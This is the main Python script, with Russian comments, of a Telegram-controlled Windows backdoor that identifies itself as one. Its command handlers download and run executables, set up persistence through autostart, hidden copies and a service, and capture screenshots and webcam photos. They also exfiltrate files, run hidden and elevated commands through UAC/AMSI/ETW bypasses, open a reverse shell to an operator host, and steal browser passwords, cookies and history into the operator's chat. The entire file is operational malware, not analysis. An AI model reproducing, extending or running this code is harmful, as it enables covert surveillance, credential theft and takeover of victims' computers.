import os
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

import time
import threading
import logging
import subprocess
from datetime import datetime
import platform
import requests

# Импорт модулей
from config import MARKER_FILE, CHECK_INTERVAL, BOT_TOKEN, CHAT_ID, SERVICE_NAME
from logger import *
from utils import (
    is_command_for_this_instance,
    clean_command,
    get_or_create_instance_id,
    get_or_create_instance_name,
    check_internet_connection,
    verify_update_success
)
from device_manager import (
    get_devices_list,
    save_devices_list,
    add_device_to_list,
    update_device_status,
    cleanup_offline_devices,
    format_devices_list
) 
from system_info import get_system_info, format_system_info
from telegram_api import send_text_to_telegram, clear_pending_updates, send_photo_to_telegram
from persistence import (
    download_and_run_exe,
    self_update,
    add_to_autostart,
    create_persistent_copy,
    create_windows_service,
    remove_all_traces,
    update_autostart_paths
)
from advanced_commands import (
    take_screenshot,
    capture_webcam,
    get_processes_list,
    kill_process,
    browse_files,
    download_file_from_device,
    execute_command_hidden
)
from stealth import apply_stealth_measures
from reverse_shell import init_global_shell, get_global_shell, stop_global_shell
from windows_bypass import create_windows_bypass, bypass_uac_command, apply_windows_bypasses
from browser_data import extract_all_browser_data, extract_browser_passwords, extract_browser_cookies, extract_browser_history

# Watchdog функции
def create_marker_file():
    """Создает маркерный файл для watchdog."""
    try:
        with open(MARKER_FILE, "w") as f:
            f.write(str(time.time()))
        logging.info(f"Маркерный файл создан: {MARKER_FILE}")
    except Exception as e:
        logging.error(f"Ошибка при создании маркерного файла: {e}")

def update_marker_file():
    """Обновляет время в маркерном файле."""
    try:
        with open(MARKER_FILE, "w") as f:
            f.write(str(time.time()))
    except Exception as e:
        logging.error(f"Ошибка при обновлении маркерного файла: {e}")

def watchdog():
    """Проверяет активность основного потока и перезапускает скрипт при необходимости."""
    logging.info("Watchdog запущен.")
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            if not os.path.exists(MARKER_FILE):
                logging.warning("Маркерный файл не найден. Перезапуск скрипта.")
                restart_script()
                continue
            
            with open(MARKER_FILE, "r") as f:
                last_update_time = float(f.read())
            
            if (time.time() - last_update_time) > (CHECK_INTERVAL * 2):  # Если не обновлялся 2 интервала
                logging.warning("Маркерный файл не обновлялся. Перезапуск скрипта.")
                restart_script()
        except Exception as e:
            logging.error(f"Ошибка в watchdog: {e}")
            restart_script()

def restart_script():
    """Перезапускает текущий скрипт."""
    logging.info("Перезапуск скрипта...")
    try:
        current_script = os.path.abspath(sys.argv[0])
        subprocess.Popen([sys.executable, current_script],
                         creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
        os._exit(0)
    except Exception as e:
        logging.error(f"Ошибка при перезапуске скрипта: {e}")

# Основная функция для прослушивания команд из Telegram
def main_listener() -> None:
    """Основной цикл прослушивания и обработки команд из Telegram."""
    logging.info("Запуск основного цикла прослушивания команд")
    
    # Получаем ID и имя экземпляра
    instance_id = get_or_create_instance_id()
    instance_name = get_or_create_instance_name()
    
    # ВАЖНОЕ ИЗМЕНЕНИЕ: Очищаем очередь и устанавливаем начальный last_update_id
    last_update_id = clear_pending_updates()
    
    reconnect_delay = 60
    max_reconnect_delay = 600
    
    while True:
        try:
            if not check_internet_connection():
                logging.warning(f"Нет интернет-соединения. Повторная попытка через {reconnect_delay} секунд")
                time.sleep(reconnect_delay)
                reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
                continue
            
            reconnect_delay = 60
            
            # Используем last_update_id, который был установлен после очистки
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35 )
            
            if response.status_code != 200:
                logging.warning(f"Ошибка при получении обновлений: HTTP {response.status_code}")
                time.sleep(5)
                continue
            
            updates = response.json()
            
            if not updates.get("ok", False):
                error_desc = updates.get("description", "Неизвестная ошибка")
                logging.warning(f"API вернул ошибку: {error_desc}")
                time.sleep(5)
                continue
            
            for update in updates.get("result", []):
                try:
                    if "message" in update and "from" in update["message"] and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        if str(chat_id) != CHAT_ID:
                            logging.warning(f"Получено сообщение из неизвестного чата: {chat_id}")
                            continue
                            
                        command = update["message"]["text"]
                        username = update["message"]["from"].get("username", "unknown")
                        user_id = update["message"]["from"].get("id", "unknown")
                        
                        logging.info(f"Получена команда: {command} от пользователя {username} (ID: {user_id})")

                        # Проверяем, предназначена ли команда для этого экземпляра
                        if not is_command_for_this_instance(command, instance_id):
                            logging.info(f"Команда {command} не предназначена для этого экземпляра (ID: {instance_id})")
                            continue

                        # Обработка команды /info
                        if command.startswith("/info"):
                            logging.info("Обработка команды /info")
                            info = get_system_info()
                            formatted_info = format_system_info(info)
                            send_text_to_telegram(formatted_info)
                        
                        # Обработка команды /download
                        elif command.startswith("/download"):
                            logging.info("Обработка команды /download")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                send_text_to_telegram(f"<b>🔄 Начинаю загрузку файла с URL:</b>\n{url}")
                                if download_and_run_exe(url):
                                    send_text_to_telegram("<b>✅ Файл успешно загружен и запущен.</b>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при загрузке или запуске файла.</b>")
                            else:
                                send_text_to_telegram("<b>❌ URL не указан.</b> Используйте формат: <code>/download [ID] URL</code>")
                        
                        # Обработка команды /update
                        elif command.startswith("/update"):
                            logging.info("Обработка команды /update")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                
                                # Проверяем, что URL валидный
                                if not url.startswith(("http://", "https://")):
                                    send_text_to_telegram("<b>❌ Неверный URL. Используйте http:// или https://</b>")
                                    continue
                                
                                send_text_to_telegram("<b>🔄 Начинаю обновление...</b>")
                                
                                if self_update(url):
                                    send_text_to_telegram("<b>✅ Обновление запущено, перезапуск...</b>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при обновлении</b>")
                            else:
                                send_text_to_telegram("<b>❌ URL не указан.</b> Используйте формат: <code>/update [ID] URL</code>")
                        
                        # Обработка команды /list
                        elif command.startswith("/list"):
                            logging.info("Обработка команды /list")
                            # Очищаем неактивные устройства
                            removed_count = cleanup_offline_devices()
                            if removed_count > 0:
                                logging.info(f"Удалено {removed_count} неактивных устройств")
                            
                            # Получаем и отправляем список устройств
                            devices = get_devices_list()
                            formatted_list = format_devices_list(devices)
                            send_text_to_telegram(formatted_list)
                        
                        # Обработка команды /restart
                        elif command.startswith("/restart"):
                            logging.info("Обработка команды /restart")
                            send_text_to_telegram("<b>🔄 Перезапуск...</b>")
                            restart_script()
                            
                        # Обработка команды /persist
                        elif command.startswith("/persist"):
                            logging.info("Обработка команды /persist")
                            send_text_to_telegram("<b>🔒 Усиление персистентности...</b>")
                            results = []
                            
                            # Создаем копии в скрытых местах
                            persistent_copy = create_persistent_copy()
                            if persistent_copy:
                                results.append("✅ Копии созданы")
                            else:
                                results.append("❌ Ошибка при создании копий")
                            
                            # Добавляем в автозагрузку
                            autostart_results = add_to_autostart()
                            success_count = sum(1 for result in autostart_results.values() if result)
                            if success_count > 0:
                                results.append(f"✅ Добавлено в автозагрузку ({success_count} методов)")
                            else:
                                results.append("❌ Ошибка при добавлении в автозагрузку")
                            
                            # Создаем службу Windows
                            if create_windows_service():
                                results.append("✅ Служба Windows создана")
                            else:
                                results.append("❌ Ошибка при создании службы Windows")
                            
                            send_text_to_telegram("<b>Результаты:</b>\n" + "\n".join(results))
                            
                        # Обработка команды /kill
                        elif command.startswith("/kill"):
                            logging.info("Обработка команды /kill")
                            # Команда для удаления бэкдора и всех следов
                            send_text_to_telegram("<b>🔄 Выполняется удаление бэкдора и всех следов...</b>")
                            removal_results = remove_all_traces()
                            send_text_to_telegram("<b>Результаты удаления:</b>\n" + "\n".join(removal_results))
                            
                            # Завершаем процесс после удаления
                            os._exit(0)

                        # Обработка команды /screenshot
                        elif command.startswith("/screenshot"):
                            logging.info("Обработка команды /screenshot")
                            send_text_to_telegram("<b>📸 Делаю скриншот экрана...</b>")
                            screenshot_path = take_screenshot()
                            if screenshot_path:
                                send_photo_to_telegram(screenshot_path, "📸 Скриншот экрана")
                                # Удаляем временный файл
                                try:
                                    os.remove(screenshot_path)
                                except:
                                    pass
                            else:
                                send_text_to_telegram("<b>❌ Ошибка при создании скриншота</b>")

                        # Обработка команды /webcam
                        elif command.startswith("/webcam"):
                            logging.info("Обработка команды /webcam")
                            send_text_to_telegram("<b>📷 Делаю фото с веб-камеры...</b>")
                            webcam_path = capture_webcam()
                            if webcam_path:
                                send_photo_to_telegram(webcam_path, "📷 Фото с веб-камеры")
                                # Удаляем временный файл
                                try:
                                    os.remove(webcam_path)
                                except:
                                    pass
                            else:
                                send_text_to_telegram("<b>❌ Ошибка при создании фото с веб-камеры</b>")

                        # Обработка команды /processes
                        elif command.startswith("/processes"):
                            logging.info("Обработка команды /processes")
                            send_text_to_telegram("<b>🔄 Получаю список процессов...</b>")
                            processes_info = get_processes_list()
                            if processes_info:
                                send_text_to_telegram(processes_info)
                            else:
                                send_text_to_telegram("<b>❌ Ошибка при получении списка процессов</b>")

                        # Обработка команды /kill_process
                        elif command.startswith("/kill_process"):
                            logging.info("Обработка команды /kill_process")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                process_id = clean_cmd.strip()
                                send_text_to_telegram(f"<b>🔄 Завершаю процесс с PID: {process_id}</b>")
                                if kill_process(process_id):
                                    send_text_to_telegram(f"<b>✅ Процесс {process_id} успешно завершен</b>")
                                else:
                                    send_text_to_telegram(f"<b>❌ Ошибка при завершении процесса {process_id}</b>")
                            else:
                                send_text_to_telegram("<b>❌ PID процесса не указан.</b> Используйте формат: <code>/kill_process [ID] PID</code>")

                        # Обработка команды /browse
                        elif command.startswith("/browse"):
                            logging.info("Обработка команды /browse")
                            clean_cmd = clean_command(command)
                            path = clean_cmd.strip() if clean_cmd else "C:\\"
                            send_text_to_telegram(f"<b>📁 Просматриваю папку: {path}</b>")
                            browse_result = browse_files(path)
                            if browse_result:
                                send_text_to_telegram(browse_result)
                            else:
                                send_text_to_telegram(f"<b>❌ Ошибка при просмотре папки: {path}</b>")

                        # Обработка команды /download_file
                        elif command.startswith("/download_file"):
                            logging.info("Обработка команды /download_file")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                file_path = clean_cmd.strip()
                                send_text_to_telegram(f"<b>📥 Загружаю файл: {file_path}</b>")
                                if download_file_from_device(file_path):
                                    send_text_to_telegram(f"<b>✅ Файл {file_path} успешно загружен</b>")
                                else:
                                    send_text_to_telegram(f"<b>❌ Ошибка при загрузке файла {file_path}</b>")
                            else:
                                send_text_to_telegram("<b>❌ Путь к файлу не указан.</b> Используйте формат: <code>/download_file [ID] путь_к_файлу</code>")

                        # Обработка команды /stealth
                        elif command.startswith("/stealth"):
                            logging.info("Обработка команды /stealth")
                            send_text_to_telegram("<b>🕵️ Применение мер скрытности...</b>")
                            stealth_results = apply_stealth_measures()
                            
                            if stealth_results.get("overall", False):
                                status = "✅ Успешно"
                            else:
                                status = "❌ Частично"
                            
                            message = f"<b>🕵️ РЕЗУЛЬТАТЫ СКРЫТНОСТИ</b>\n\n"
                            message += f"<b>Статус:</b> {status}\n\n"
                            
                            if stealth_results.get("disguise"):
                                message += "✅ <b>Маскировка:</b> Процесс замаскирован\n"
                            else:
                                message += "❌ <b>Маскировка:</b> Не удалось\n"
                            
                            vm_detection = stealth_results.get("vm_detection", {})
                            if vm_detection.get("overall"):
                                message += "⚠️ <b>VM:</b> Обнаружена виртуальная среда\n"
                            else:
                                message += "✅ <b>VM:</b> Виртуальная среда не обнаружена\n"
                            
                            send_text_to_telegram(message)

                        # Обработка команды /cmd
                        elif command.startswith("/cmd"):
                            logging.info("Обработка команды /cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>💻 Выполняю команду (обычный пользователь):</b>\n<code>{cmd_text}</code>")
                                result = execute_command_hidden(cmd_text, admin=False)
                                if result:
                                    send_text_to_telegram(f"<b>✅ Результат выполнения:</b>\n<code>{result}</code>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при выполнении команды</b>")
                            else:
                                send_text_to_telegram("<b>❌ Команда не указана.</b> Используйте формат: <code>/cmd [ID] команда</code>")

                        # Обработка команды /admin_cmd
                        elif command.startswith("/admin_cmd"):
                            logging.info("Обработка команды /admin_cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>🔐 Выполняю команду (администратор):</b>\n<code>{cmd_text}</code>")
                                result = execute_command_hidden(cmd_text, admin=True)
                                if result:
                                    send_text_to_telegram(f"<b>✅ Результат выполнения:</b>\n<code>{result}</code>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при выполнении команды</b>")
                            else:
                                send_text_to_telegram("<b>❌ Команда не указана.</b> Используйте формат: <code>/admin_cmd [ID] команда</code>")

                        # Обработка команды /reverse_shell_start
                        elif command.startswith("/reverse_shell_start"):
                            logging.info("Обработка команды /reverse_shell_start")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                # Парсим параметры: host:port
                                params = clean_cmd.strip().split(':')
                                if len(params) == 2:
                                    host = params[0]
                                    try:
                                        port = int(params[1])
                                        send_text_to_telegram(f"<b>🔗 Запуск Reverse Shell на {host}:{port}...</b>")
                                        shell = init_global_shell(host, port)
                                        if shell:
                                            send_text_to_telegram(f"<b>✅ Reverse Shell запущен на {host}:{port}</b>")
                                        else:
                                            send_text_to_telegram("<b>❌ Ошибка запуска Reverse Shell</b>")
                                    except ValueError:
                                        send_text_to_telegram("<b>❌ Неверный порт.</b> Используйте формат: <code>/reverse_shell_start [ID] host:port</code>")
                                else:
                                    send_text_to_telegram("<b>❌ Неверный формат.</b> Используйте формат: <code>/reverse_shell_start [ID] host:port</code>")
                            else:
                                send_text_to_telegram("<b>❌ Параметры не указаны.</b> Используйте формат: <code>/reverse_shell_start [ID] host:port</code>")

                        # Обработка команды /reverse_shell_stop
                        elif command.startswith("/reverse_shell_stop"):
                            logging.info("Обработка команды /reverse_shell_stop")
                            stop_global_shell()
                            send_text_to_telegram("<b>🛑 Reverse Shell остановлен</b>")

                        # Обработка команды /reverse_shell_status
                        elif command.startswith("/reverse_shell_status"):
                            logging.info("Обработка команды /reverse_shell_status")
                            shell = get_global_shell()
                            if shell:
                                status = shell.get_status()
                                message = f"<b>🔗 СТАТУС REVERSE SHELL</b>\n\n"
                                message += f"<b>Запущен:</b> {'✅ Да' if status['is_running'] else '❌ Нет'}\n"
                                message += f"<b>Подключен:</b> {'✅ Да' if status['is_connected'] else '❌ Нет'}\n"
                                message += f"<b>Хост:</b> {status['host']}\n"
                                message += f"<b>Порт:</b> {status['port']}\n"
                                message += f"<b>Попытки переподключения:</b> {status['reconnect_attempts']}\n"
                                send_text_to_telegram(message)
                            else:
                                send_text_to_telegram("<b>❌ Reverse Shell не запущен</b>")

                        # Обработка команды /windows_bypass
                        elif command.startswith("/windows_bypass"):
                            logging.info("Обработка команды /windows_bypass")
                            send_text_to_telegram("<b>🛡️ Применение Windows Bypass...</b>")
                            
                            bypass_results = apply_windows_bypasses()
                            
                            message = f"<b>🛡️ РЕЗУЛЬТАТЫ WINDOWS BYPASS</b>\n\n"
                            
                            # UAC bypass
                            if bypass_results.get("uac"):
                                uac = bypass_results["uac"]
                                if uac["success"]:
                                    message += f"✅ <b>UAC Bypass:</b> {uac['method']}\n"
                                else:
                                    message += f"❌ <b>UAC Bypass:</b> {uac.get('error', 'Не удалось')}\n"
                            else:
                                message += "⚠️ <b>UAC Bypass:</b> Не тестировался\n"
                            
                            # AMSI bypass
                            amsi = bypass_results.get("amsi", {})
                            if amsi.get("success"):
                                message += f"✅ <b>AMSI Bypass:</b> {amsi['method']}\n"
                            else:
                                message += f"❌ <b>AMSI Bypass:</b> {amsi.get('error', 'Не удалось')}\n"
                            
                            # ETW bypass
                            etw = bypass_results.get("etw", {})
                            if etw.get("success"):
                                message += f"✅ <b>ETW Bypass:</b> {etw['method']}\n"
                            else:
                                message += f"❌ <b>ETW Bypass:</b> {etw.get('error', 'Не удалось')}\n"
                            
                            # Общий результат
                            if bypass_results.get("overall_success"):
                                message += "\n🎉 <b>Общий результат:</b> Все bypass применены успешно!"
                            else:
                                message += "\n⚠️ <b>Общий результат:</b> Частичный успех"
                            
                            send_text_to_telegram(message)

                        # Обработка команды /elevated_cmd
                        elif command.startswith("/elevated_cmd"):
                            logging.info("Обработка команды /elevated_cmd")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                cmd_text = clean_cmd.strip()
                                send_text_to_telegram(f"<b>🔐 Выполняю команду с повышенными привилегиями:</b>\n<code>{cmd_text}</code>")
                                
                                result = bypass_uac_command(cmd_text)
                                if result["success"]:
                                    output = result.get("output", "Команда выполнена успешно")
                                    method = result.get("bypass_method", "Неизвестно")
                                    send_text_to_telegram(f"<b>✅ Команда выполнена через {method}:</b>\n<code>{output}</code>")
                                else:
                                    error = result.get("error", "Неизвестная ошибка")
                                    send_text_to_telegram(f"<b>❌ Ошибка выполнения:</b>\n<code>{error}</code>")
                            else:
                                send_text_to_telegram("<b>❌ Команда не указана.</b> Используйте формат: <code>/elevated_cmd [ID] команда</code>")

                        # Обработка команды /browser_data
                        elif command.startswith("/browser_data"):
                            logging.info("Обработка команды /browser_data")
                            try:
                                # Извлекаем параметры
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # Извлекаем все данные браузеров
                                    result = extract_all_browser_data(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>🌐 ДАННЫЕ БРАУЗЕРОВ</b>\n\n"
                                        message += f"<b>Всего паролей:</b> {result['total_passwords']}\n"
                                        message += f"<b>Всего куки:</b> {result['total_cookies']}\n"
                                        message += f"<b>Всего записей истории:</b> {result['total_history']}\n\n"
                                        
                                        for browser, data in result["browsers"].items():
                                            if "error" not in data:
                                                message += f"<b>{browser.upper()}:</b>\n"
                                                message += f"  Пароли: {len(data.get('passwords', []))}\n"
                                                message += f"  Куки: {len(data.get('cookies', []))}\n"
                                                message += f"  История: {len(data.get('history', []))}\n\n"
                                            else:
                                                message += f"<b>{browser.upper()}:</b> ❌ {data['error']}\n\n"
                                    else:
                                        message = f"<b>❌ ОШИБКА ИЗВЛЕЧЕНИЯ ДАННЫХ</b>\n\n{result['error']}"
                                else:
                                    message = "<b>❌ НЕПРАВИЛЬНЫЙ ФОРМАТ КОМАНДЫ</b>\n\n"
                                    message += "<code>/browser_data [ID] [браузер]</code>\n"
                                    message += "<i>Браузер: chrome, firefox, edge, safari (необязательно)</i>"
                                    
                            except Exception as e:
                                message = f"<b>❌ ОШИБКА ОБРАБОТКИ КОМАНДЫ</b>\n\n{str(e)}"
                                logging.error(f"Ошибка обработки команды /browser_data: {e}")
                            
                            # Отправляем результат
                            send_text_to_telegram(message)

                        # Обработка команды /browser_passwords
                        elif command.startswith("/browser_passwords"):
                            logging.info("Обработка команды /browser_passwords")
                            try:
                                # Извлекаем параметры
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # Извлекаем пароли
                                    result = extract_browser_passwords(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>🔐 ПАРОЛИ БРАУЗЕРОВ</b>\n\n"
                                        message += f"<b>Найдено паролей:</b> {len(result['passwords'])}\n\n"
                                        
                                        # Показываем первые 10 паролей
                                        for i, pwd in enumerate(result["passwords"][:10]):
                                            message += f"<b>{i+1}.</b> {pwd['url']}\n"
                                            message += f"   Пользователь: {pwd['username']}\n"
                                            message += f"   Пароль: {pwd['password']}\n"
                                            if pwd.get('browser'):
                                                message += f"   Браузер: {pwd['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["passwords"]) > 10:
                                            message += f"<i>... и еще {len(result['passwords']) - 10} паролей</i>"
                                    else:
                                        message = f"<b>❌ ОШИБКА ИЗВЛЕЧЕНИЯ ПАРОЛЕЙ</b>\n\n{result['error']}"
                                else:
                                    message = "<b>❌ НЕПРАВИЛЬНЫЙ ФОРМАТ КОМАНДЫ</b>\n\n"
                                    message += "<code>/browser_passwords [ID] [браузер]</code>\n"
                                    message += "<i>Браузер: chrome, firefox, edge, safari (необязательно)</i>"
                                    
                            except Exception as e:
                                message = f"<b>❌ ОШИБКА ОБРАБОТКИ КОМАНДЫ</b>\n\n{str(e)}"
                                logging.error(f"Ошибка обработки команды /browser_passwords: {e}")
                            
                            # Отправляем результат
                            send_text_to_telegram(message)

                        # Обработка команды /browser_cookies
                        elif command.startswith("/browser_cookies"):
                            logging.info("Обработка команды /browser_cookies")
                            try:
                                # Извлекаем параметры
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # Извлекаем куки
                                    result = extract_browser_cookies(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>🍪 КУКИ БРАУЗЕРОВ</b>\n\n"
                                        message += f"<b>Найдено куки:</b> {len(result['cookies'])}\n\n"
                                        
                                        # Показываем первые 10 куки
                                        for i, cookie in enumerate(result["cookies"][:10]):
                                            message += f"<b>{i+1}.</b> {cookie['domain']}\n"
                                            message += f"   Имя: {cookie['name']}\n"
                                            message += f"   Значение: {cookie['value'][:50]}...\n"
                                            if cookie.get('browser'):
                                                message += f"   Браузер: {cookie['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["cookies"]) > 10:
                                            message += f"<i>... и еще {len(result['cookies']) - 10} куки</i>"
                                    else:
                                        message = f"<b>❌ ОШИБКА ИЗВЛЕЧЕНИЯ КУКИ</b>\n\n{result['error']}"
                                else:
                                    message = "<b>❌ НЕПРАВИЛЬНЫЙ ФОРМАТ КОМАНДЫ</b>\n\n"
                                    message += "<code>/browser_cookies [ID] [браузер]</code>\n"
                                    message += "<i>Браузер: chrome, firefox, edge, safari (необязательно)</i>"
                                    
                            except Exception as e:
                                message = f"<b>❌ ОШИБКА ОБРАБОТКИ КОМАНДЫ</b>\n\n{str(e)}"
                                logging.error(f"Ошибка обработки команды /browser_cookies: {e}")
                            
                            # Отправляем результат
                            send_text_to_telegram(message)

                        # Обработка команды /browser_history
                        elif command.startswith("/browser_history"):
                            logging.info("Обработка команды /browser_history")
                            try:
                                # Извлекаем параметры
                                parts = command.split(" ", 2)
                                if len(parts) >= 2:
                                    device_id = parts[1]
                                    browser_name = parts[2] if len(parts) > 2 else None
                                    
                                    # Извлекаем историю
                                    result = extract_browser_history(browser_name)
                                    
                                    if result["success"]:
                                        message = f"<b>📚 ИСТОРИЯ БРАУЗЕРОВ</b>\n\n"
                                        message += f"<b>Найдено записей:</b> {len(result['history'])}\n\n"
                                        
                                        # Показываем первые 10 записей
                                        for i, entry in enumerate(result["history"][:10]):
                                            message += f"<b>{i+1}.</b> {entry['url']}\n"
                                            if entry.get('title'):
                                                message += f"   Заголовок: {entry['title']}\n"
                                            if entry.get('browser'):
                                                message += f"   Браузер: {entry['browser']}\n"
                                            message += "\n"
                                        
                                        if len(result["history"]) > 10:
                                            message += f"<i>... и еще {len(result['history']) - 10} записей</i>"
                                    else:
                                        message = f"<b>❌ ОШИБКА ИЗВЛЕЧЕНИЯ ИСТОРИИ</b>\n\n{result['error']}"
                                else:
                                    message = "<b>❌ НЕПРАВИЛЬНЫЙ ФОРМАТ КОМАНДЫ</b>\n\n"
                                    message += "<code>/browser_history [ID] [браузер]</code>\n"
                                    message += "<i>Браузер: chrome, firefox, edge, safari (необязательно)</i>"
                                    
                            except Exception as e:
                                message = f"<b>❌ ОШИБКА ОБРАБОТКИ КОМАНДЫ</b>\n\n{str(e)}"
                                logging.error(f"Ошибка обработки команды /browser_history: {e}")
                            
                            # Отправляем результат
                            send_text_to_telegram(message)

                        # Обработка команды /help
                        elif command.startswith("/help"):
                            logging.info("Обработка команды /help")
                            help_message = """📚 <b>СПРАВКА ПО КОМАНДАМ:</b>

<code>/info [ID]</code> - Получить информацию о системе.
<code>/list</code> - Получить список всех активных устройств.
<code>/download [ID] [URL]</code> - Загрузить и запустить EXE файл.
<code>/update [ID] [URL]</code> - Обновить скрипт до новой версии.
<code>/persist [ID]</code> - Усилить персистентность (автозагрузка, скрытые копии, служба).
<code>/restart [ID]</code> - Перезапустить скрипт.
<code>/kill [ID]</code> - Удалить бэкдор и все его следы.

<b>🆕 НОВЫЕ КОМАНДЫ:</b>
<code>/screenshot [ID]</code> - Сделать скриншот экрана.
<code>/webcam [ID]</code> - Сделать фото с веб-камеры.
<code>/processes [ID]</code> - Получить список процессов.
<code>/kill_process [ID] [PID]</code> - Завершить процесс по PID.
<code>/browse [ID] [путь]</code> - Просмотреть содержимое папки.
<code>/download_file [ID] [путь]</code> - Загрузить файл с устройства.
<code>/stealth [ID]</code> - Применить меры скрытности.

<b>💻 КОМАНДНАЯ СТРОКА:</b>
<code>/cmd [ID] [команда]</code> - Выполнить команду от имени обычного пользователя.
<code>/admin_cmd [ID] [команда]</code> - Выполнить команду от имени администратора.

<b>🔗 REVERSE SHELL:</b>
<code>/reverse_shell_start [ID] host:port</code> - Запустить reverse shell.
<code>/reverse_shell_stop [ID]</code> - Остановить reverse shell.
<code>/reverse_shell_status [ID]</code> - Статус reverse shell.

<b>🛡️ WINDOWS BYPASS:</b>
<code>/windows_bypass [ID]</code> - Применить все методы bypass (UAC/AMSI/ETW).
<code>/elevated_cmd [ID] [команда]</code> - Выполнить команду с повышенными привилегиями.

<b>🌐 БРАУЗЕР-ДАННЫЕ:</b>
<code>/browser_data [ID] [браузер]</code> - Извлечь все данные браузеров.
<code>/browser_passwords [ID] [браузер]</code> - Извлечь пароли браузеров.
<code>/browser_cookies [ID] [браузер]</code> - Извлечь куки браузеров.
<code>/browser_history [ID] [браузер]</code> - Извлечь историю браузеров.

<code>/help</code> - Показать это сообщение.

<b>[ID]</b> - Необязательный параметр. Если указан, команда будет выполнена только на устройстве с этим ID. Если не указан, команда выполняется на всех устройствах.
"""
                            send_text_to_telegram(help_message)
                        
                        else:
                            logging.info(f"Неизвестная команда: {command}")
                            send_text_to_telegram(f"<b>❌ Неизвестная команда:</b> <code>{command}</code>\n💡 <b>Справка:</b> /help")
                            
                    last_update_id = update["update_id"]
                except Exception as e:
                    logging.error(f"Ошибка при обработке обновления: {e}")
            
            time.sleep(1) # Короткая задержка, чтобы не спамить запросами
            
        except requests.exceptions.RequestException as e:
            logging.error(f"Ошибка сети при получении обновлений: {e}")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
        except Exception as e:
            logging.error(f"Непредвиденная ошибка в основном цикле: {e}")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)

def main():
    try:
        # Проверяем, не запущен ли скрипт для обновления автозагрузки
        if len(sys.argv) > 1 and sys.argv[1] == "--update-autostart":
            logging.info("Запуск для обновления автозагрузки")
            try:
                current_script = os.path.abspath(sys.argv[0])
                results = update_autostart_paths(current_script)
                
                # Логируем результаты
                success_count = sum(1 for result in results.values() if result)
                logging.info(f"Обновление автозагрузки завершено: {success_count}/{len(results)} методов успешно")
                
                # Завершаем процесс
                os._exit(0)
                
            except Exception as e:
                logging.error(f"Ошибка при обновлении автозагрузки: {e}")
                os._exit(1)
        
        logging.info("Запуск бэкдора")
        
        # Отправляем уведомление о запуске
        instance_id = get_or_create_instance_id()
        instance_name = get_or_create_instance_name()
        
        # Получаем информацию о системе и добавляем устройство в список
        system_info = get_system_info()
        add_device_to_list(instance_id, instance_name, system_info)
        
        startup_message = f"""🚀 <b>БЭКДОР ЗАПУЩЕН</b>

🆔 <b>Экземпляр:</b> <code>{instance_id}</code>
📝 <b>Имя:</b> <code>{instance_name}</code>
🕐 <b>Время:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
💻 <b>Система:</b> {platform.system()} {platform.release()}
👤 <b>Пользователь:</b> {system_info.get("username", "N/A")}

✅ <b>Статус:</b> Готов к работе
💡 <b>Справка:</b> /help"""
        
        send_text_to_telegram(startup_message)
        
        # Создаем маркерный файл
        create_marker_file()
        
        # Запускаем watchdog в отдельном потоке
        watchdog_thread = threading.Thread(target=watchdog, daemon=True)
        watchdog_thread.start()
        
        # Запускаем основной цикл прослушивания
        while True:
            try:
                # Обновляем маркерный файл
                update_marker_file()
                
                # Запускаем основной listener
                main_listener()
                
            except KeyboardInterrupt:
                logging.info("Получен сигнал прерывания")
                break
            except Exception as e:
                logging.error(f"Ошибка в основном цикле: {e}")
             
            time.sleep(1) # Короткая задержка, чтобы не спамить запросами

    except Exception as e:
        logging.critical(f"Критическая ошибка: {e}")
        send_text_to_telegram(f"<b>❌ Критическая ошибка:</b>\n<code>{str(e)}</code>")

if __name__ == "__main__":
    main()

